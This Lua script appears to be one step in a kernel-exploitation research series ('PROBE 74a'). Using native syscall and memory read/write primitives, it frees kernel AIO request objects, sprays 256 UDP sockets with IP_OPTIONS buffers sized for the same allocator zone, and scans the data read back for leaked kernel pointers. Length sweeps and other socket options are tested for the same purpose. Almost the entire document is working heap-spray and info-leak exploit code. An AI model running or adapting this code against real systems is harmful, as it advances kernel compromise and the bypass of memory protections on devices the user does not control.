-- CRASH_CLASS: LOW
-- PROBE 74a: IP_OPTIONS setsockopt with proper TLV format
--
-- 69d got len=0 from getsockopt — options weren't in valid IP TLV format.
-- ip_pcbopts() does malloc(cnt, M_IPOPT, M_WAITOK). If cnt is 33-48,
-- it lands in malloc-64 zone — potentially R's 48B zone (0x1ab59e0).
--
-- Tests: valid NOP/EOL/RR options, length sweep, AIO-free + spray readback.

print("=== PROBE 74a: IP_OPTIONS PROPER FORMAT ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do wb(N(p) + i - 1, string.byte(s, i)) end
    wb(N(p) + #s, 0)
    return p
end

local function fill_sentinel(addr, len, val)
    val = val or 0xDE
    for i = 0, len - 1 do wb(N(addr) + i, val) end
end

local function hexdump(addr, len, label)
    local out = {}
    for i = 0, len - 1 do
        local b = rb(N(addr) + i)
        if b then out[#out + 1] = string.format("%02X", b)
        else out[#out + 1] = "??" end
        if (i + 1) % 16 == 0 then
            print(string.format("  %s +0x%02X: %s", label or "", i - 15, table.concat(out, " ")))
            out = {}
        end
    end
    if #out > 0 then
        local off = len - #out
        print(string.format("  %s +0x%02X: %s", label or "", off, table.concat(out, " ")))
    end
end

local function scan_kptrs(addr, len)
    local found = 0
    local i = 0
    while i + 7 < len do
        local lo = rd(N(addr) + i)
        local hi = rd(N(addr) + i + 4)
        if lo and hi then
            if lo < 0 then lo = lo + 0x100000000 end
            if hi < 0 then hi = hi + 0x100000000 end
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                print(string.format("  *** KPTR at +0x%02X: 0x%08X%08X ***", i, hi, lo))
                found = found + 1
            end
        end
        i = i + 4
    end
    return found
end

local sc_socket = mk(97)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_close = mk(6)

local function make_udp()
    local fd = nil
    pcall(function()
        fd = sc_socket(uint64(2), uint64(2), uint64(0))
    end)
    if fd == nil then return -1 end
    return N(fd)
end

local function set_ipoptions(fd, optbuf, optlen)
    local ret = nil
    pcall(function()
        ret = sc_setsockopt(uint64(fd), uint64(0), uint64(1),
            uint64(N(optbuf)), uint64(optlen))
    end)
    return ret and N(ret) or -999
end

local function get_ipoptions(fd, outbuf, outlen_ptr, bufsize)
    wd(N(outlen_ptr), bufsize)
    local ret = nil
    pcall(function()
        ret = sc_getsockopt(uint64(fd), uint64(0), uint64(1),
            uint64(N(outbuf)), uint64(N(outlen_ptr)))
    end)
    local retlen = rd(N(outlen_ptr)) or 0
    if retlen < 0 then retlen = retlen + 0x100000000 end
    return (ret and N(ret) or -999), retlen
end

-- ============================================================
-- [A] Minimal valid options (4 bytes: NOP NOP NOP EOL)
-- ============================================================
print("[A] Minimal valid options (4B: NOP NOP NOP EOL)")
local fd_a = make_udp()
print("  fd=" .. fd_a)
if fd_a >= 0 then
    local opt = memory.alloc(8)
    wb(N(opt), 0x01)       -- NOP
    wb(N(opt) + 1, 0x01)   -- NOP
    wb(N(opt) + 2, 0x01)   -- NOP
    wb(N(opt) + 3, 0x00)   -- EOL

    local sret = set_ipoptions(fd_a, opt, 4)
    print("  setsockopt ret=" .. sret)

    local outbuf = memory.alloc(128)
    local outlenp = memory.alloc(8)
    fill_sentinel(outbuf, 128)
    local gret, glen = get_ipoptions(fd_a, outbuf, outlenp, 128)
    print("  getsockopt ret=" .. gret .. " len=" .. glen)

    if glen > 0 then
        hexdump(outbuf, math.min(glen + 16, 64), "A")
        local kp = scan_kptrs(outbuf, math.min(glen + 16, 64))
        print("  kptrs=" .. kp)
    else
        print("  len=0 — options not stored")
    end
    pcall(function() sc_close(uint64(fd_a)) end)
end

if not alive() then print("DEAD after [A]"); return end

-- ============================================================
-- [B] Maximum valid options (40 bytes: 39 NOPs + EOL)
-- ============================================================
print("")
print("[B] Maximum valid options (40B: 39×NOP + EOL)")
local fd_b = make_udp()
print("  fd=" .. fd_b)
if fd_b >= 0 then
    local opt = memory.alloc(44)
    for i = 0, 38 do wb(N(opt) + i, 0x01) end  -- 39 NOPs
    wb(N(opt) + 39, 0x00)                        -- EOL

    local sret = set_ipoptions(fd_b, opt, 40)
    print("  setsockopt ret=" .. sret)

    local outbuf = memory.alloc(128)
    local outlenp = memory.alloc(8)
    fill_sentinel(outbuf, 128)
    local gret, glen = get_ipoptions(fd_b, outbuf, outlenp, 128)
    print("  getsockopt ret=" .. gret .. " len=" .. glen)

    if glen > 0 then
        hexdump(outbuf, math.min(glen + 16, 64), "B")
        local kp = scan_kptrs(outbuf, math.min(glen + 16, 64))
        print("  kptrs=" .. kp)
    else
        print("  len=0 — options not stored")
    end
    pcall(function() sc_close(uint64(fd_b)) end)
end

if not alive() then print("DEAD after [B]"); return end

-- ============================================================
-- [C] Record Route option (type=0x07)
-- ============================================================
print("")
print("[C] Record Route option (type=0x07, len=39)")
local fd_c = make_udp()
print("  fd=" .. fd_c)
if fd_c >= 0 then
    local opt = memory.alloc(44)
    wb(N(opt), 0x07)       -- Record Route type
    wb(N(opt) + 1, 39)     -- length
    wb(N(opt) + 2, 4)      -- pointer (start of route data)
    for i = 3, 38 do wb(N(opt) + i, 0x00) end  -- route data (zeros)
    wb(N(opt) + 39, 0x00)  -- EOL pad to 40

    local sret = set_ipoptions(fd_c, opt, 40)
    print("  setsockopt ret=" .. sret)

    local outbuf = memory.alloc(128)
    local outlenp = memory.alloc(8)
    fill_sentinel(outbuf, 128)
    local gret, glen = get_ipoptions(fd_c, outbuf, outlenp, 128)
    print("  getsockopt ret=" .. gret .. " len=" .. glen)

    if glen > 0 then
        hexdump(outbuf, math.min(glen + 16, 64), "C")
        local kp = scan_kptrs(outbuf, math.min(glen + 16, 64))
        print("  kptrs=" .. kp)
    else
        print("  len=0 — options not stored")
    end
    pcall(function() sc_close(uint64(fd_c)) end)
end

if not alive() then print("DEAD after [C]"); return end

-- ============================================================
-- [D] Spray after AIO free (256 sockets × 40B options)
-- ============================================================
print("")
print("[D] AIO free + IP_OPTIONS spray")

local zero_fd = -1
pcall(function()
    zero_fd = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
end)
print("  zero_fd=" .. zero_fd)

if zero_fd >= 0 then
    local reqs = memory.alloc(0x30)
    local data_buf = memory.alloc(0x1000)
    local one_id = memory.alloc(8)
    local one_st = memory.alloc(8)
    local result_buf = memory.alloc(0x100)

    local function submit_aio()
        wq(N(reqs), uint64(0))
        wq(N(reqs) + 8, uint64(16))
        local bh, bl = get_hi_lo(uint64(N(data_buf)))
        wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
        local rh, rl = get_hi_lo(uint64(N(result_buf)))
        wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
        wd(N(reqs) + 0x20, zero_fd); wd(N(reqs) + 0x24, 0)
        wd(N(one_id), 0)
        pcall(function()
            mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
        end)
        return rd(N(one_id)) or 0
    end

    -- Submit 32 AIO requests
    local ids = {}
    for i = 1, 32 do
        local id = submit_aio()
        if id ~= 0 then ids[#ids + 1] = id end
    end
    print("  submitted " .. #ids .. " AIO requests")

    -- Poll all
    for _, id in ipairs(ids) do
        wd(N(one_id), id); wd(N(one_st), 0)
        pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    end

    -- Delete all (frees R objects with kernel ptrs at +0x00/+0x08)
    local del_ok = 0
    for _, id in ipairs(ids) do
        wd(N(one_id), id); wd(N(one_st), 0)
        pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
        local st = rd(N(one_st)) or -1
        if st < 0 then st = st + 0x100000000 end
        if st == 0 then del_ok = del_ok + 1 end
    end
    print("  deleted " .. del_ok .. "/" .. #ids .. " R objects (kernel ptrs survive)")

    if not alive() then print("DEAD after AIO free"); return end

    -- Spray: 256 UDP sockets with 40-byte NOP options
    local spray_fds = {}
    local opt40 = memory.alloc(44)
    for i = 0, 38 do wb(N(opt40) + i, 0x01) end
    wb(N(opt40) + 39, 0x00)

    for i = 1, 256 do
        if not alive() then print("DEAD at spray " .. i); break end
        local sfd = make_udp()
        if sfd < 0 then
            print("  socket failed at i=" .. i)
            break
        end
        local sr = set_ipoptions(sfd, opt40, 40)
        if sr == 0 then
            spray_fds[#spray_fds + 1] = sfd
        else
            pcall(function() sc_close(uint64(sfd)) end)
        end
    end
    print("  sprayed " .. #spray_fds .. " sockets with 40B IP_OPTIONS")

    -- Readback: getsockopt on each with 64B buffer, scan for kptrs
    local total_kptrs = 0
    local outbuf = memory.alloc(128)
    local outlenp = memory.alloc(8)

    for i, sfd in ipairs(spray_fds) do
        fill_sentinel(outbuf, 128)
        local gret, glen = get_ipoptions(sfd, outbuf, outlenp, 128)
        if glen > 0 then
            local kp = scan_kptrs(outbuf, math.min(glen + 16, 64))
            if kp > 0 then
                print(string.format("  SPRAY[%d] fd=%d len=%d KPTRS=%d", i, sfd, glen, kp))
                hexdump(outbuf, math.min(glen + 16, 64), "D")
                total_kptrs = total_kptrs + kp
            end
        end
        if i <= 3 or (glen > 0 and glen ~= 40) then
            print(string.format("  spray[%d] fd=%d len=%d", i, sfd, glen))
        end
    end
    print("  D total kptrs: " .. total_kptrs)

    -- Cleanup spray sockets
    for _, sfd in ipairs(spray_fds) do
        pcall(function() sc_close(uint64(sfd)) end)
    end
end

if not alive() then print("DEAD after [D]"); return end

-- ============================================================
-- [E] Length sweep: what sizes does setsockopt(IP_OPTIONS) accept?
-- ============================================================
print("")
print("[E] Option length sweep")

local outbuf_e = memory.alloc(128)
local outlenp_e = memory.alloc(8)

for _, olen in ipairs({1, 2, 3, 4, 8, 12, 16, 20, 24, 28, 32, 36, 40, 44, 48, 52, 56, 60, 64}) do
    local fd_e = make_udp()
    if fd_e < 0 then break end

    local opt_e = memory.alloc(olen + 4)
    -- Fill with NOPs, last byte EOL
    for i = 0, olen - 2 do wb(N(opt_e) + i, 0x01) end
    wb(N(opt_e) + olen - 1, 0x00)

    local sret = set_ipoptions(fd_e, opt_e, olen)

    fill_sentinel(outbuf_e, 128)
    local gret, glen = get_ipoptions(fd_e, outbuf_e, outlenp_e, 128)

    -- Count non-sentinel bytes past returned length
    local extra = 0
    if glen > 0 then
        for i = glen, math.min(glen + 24, 127) do
            local b = rb(N(outbuf_e) + i)
            if b and b ~= 0xDE then extra = extra + 1 end
        end
    end

    print(string.format("  len=%2d: set=%d get=%d retlen=%d extra_past_len=%d",
        olen, sret, gret, glen, extra))

    pcall(function() sc_close(uint64(fd_e)) end)
end

if not alive() then print("DEAD after [E]"); return end

-- ============================================================
-- [F] IP_HDRINCL alternative: does it change allocation path?
-- ============================================================
print("")
print("[F] IP_HDRINCL + IP_OPTIONS combo")
local fd_f = make_udp()
print("  fd=" .. fd_f)
if fd_f >= 0 then
    -- Set IP_HDRINCL first (option 2)
    local one = memory.alloc(4)
    wd(N(one), 1)
    local hret = -999
    pcall(function()
        hret = N(sc_setsockopt(uint64(fd_f), uint64(0), uint64(2),
            uint64(N(one)), uint64(4)))
    end)
    print("  IP_HDRINCL set ret=" .. hret)

    -- Now set IP_OPTIONS
    local opt_f = memory.alloc(44)
    for i = 0, 38 do wb(N(opt_f) + i, 0x01) end
    wb(N(opt_f) + 39, 0x00)
    local sret = set_ipoptions(fd_f, opt_f, 40)
    print("  IP_OPTIONS set ret=" .. sret)

    fill_sentinel(outbuf_e, 128)
    local gret, glen = get_ipoptions(fd_f, outbuf_e, outlenp_e, 128)
    print("  getsockopt ret=" .. gret .. " len=" .. glen)
    if glen > 0 then
        hexdump(outbuf_e, math.min(glen + 16, 64), "F")
    end

    pcall(function() sc_close(uint64(fd_f)) end)
end

-- ============================================================
-- [G] Try other IP sockopts that allocate kernel memory
-- ============================================================
print("")
print("[G] Other IP sockopts that may allocate kernel memory")

local other_opts = {
    {name="IP_MULTICAST_IF", num=9},
    {name="IP_TOS", num=3},
    {name="IP_TTL", num=4},
    {name="IP_RECVOPTS", num=5},
    {name="IP_RECVRETOPTS", num=6},
    {name="IP_RECVDSTADDR", num=7},
    {name="IP_SENDSRCADDR", num=7},
    {name="IP_RETOPTS", num=8},
}

local fd_g = make_udp()
if fd_g >= 0 then
    for _, o in ipairs(other_opts) do
        fill_sentinel(outbuf_e, 128)
        wd(N(outlenp_e), 128)
        local gret = -999
        pcall(function()
            gret = N(sc_getsockopt(uint64(fd_g), uint64(0), uint64(o.num),
                uint64(N(outbuf_e)), uint64(N(outlenp_e))))
        end)
        local glen = rd(N(outlenp_e)) or 0
        if glen < 0 then glen = glen + 0x100000000 end
        local kp = 0
        if glen > 0 then kp = scan_kptrs(outbuf_e, math.min(glen + 8, 64)) end
        print(string.format("  %s(%d): ret=%d len=%d kptrs=%d",
            o.name, o.num, gret, glen, kp))
    end
    pcall(function() sc_close(uint64(fd_g)) end)
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 74a COMPLETE ===")
